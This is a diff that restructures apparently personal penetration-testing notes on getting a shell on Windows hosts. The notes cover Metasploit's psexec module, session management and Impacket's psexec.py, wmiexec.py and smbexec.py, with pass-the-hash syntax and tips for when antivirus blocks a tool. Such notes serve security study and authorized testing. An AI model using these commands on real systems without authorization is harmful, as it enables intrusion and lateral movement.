@@ -1,58 +1,53 @@
 # Gaining Shell Access
 
-gaining shell access Metasploit -- is noisy&#x20;
+## Metasploit (Noisy)
 
-
-
+```bash
 use exploit/windows/smb/psexec
+```
 
+Options:
+- `SMBDOMAIN` - Domain/server name
+- `SMBPASS` - Password or NTLM hash
+- `SMBUSER` - Username to authenticate
 
+Target selection: **Target 2** is usually best (options 0-2 work, 3-4 typically don't).
 
-smbdomain - server name of the domain
+**Note:** Firewall must be disabled on target for this attack.
 
-smbpass - password for a specific user / could use password hash
+### Managing Sessions
 
-smb user - user to authenticate
+```bash
+# Background current session
+background
 
+# List all sessions
+sessions
 
+# Interact with session
+sessions -i SESSION_ID
+```
 
+This allows running multiple shells/exploits simultaneously (basic C2 functionality).
 
+## Impacket Tools (Quieter)
 
-psexec.py use for less noise
+### psexec.py
 
-psexec.py domain/username:'pass' @ip address --- can use password hash also
+```bash
+psexec.py domain/username:'password'@TARGET_IP
 
+# With hash
+psexec.py domain/username@TARGET_IP -hashes LMHASH:NTHASH
+```
 
+### Alternatives
 
-make sure the firewall is disabled to preform this attack.
+If psexec.py fails or AV blocks it:
 
+```bash
+wmiexec.py domain/username:'password'@TARGET_IP
+smbexec.py domain/username:'password'@TARGET_IP
+```
 
-
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
-
-<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
-
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
-
-Target 2 is best but can choose between 0-2. 3 and 4 don't work as well
-
-
-
-msf6 background - lets you execute more commands or exploits while holding the previous shell open
-
-
-
-you could basically create a command and control if you want having multiple shells/exploits running in the background
-
-
-
-sessions brings up the sessions that are in the background and can select them with the correlating ID
-
-
-
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
-
-if psexec.py is not working or using anti-virus try wmiexec.py or smbexec.py -- depends on the machine
-
-
-
+Choice depends on target machine configuration.
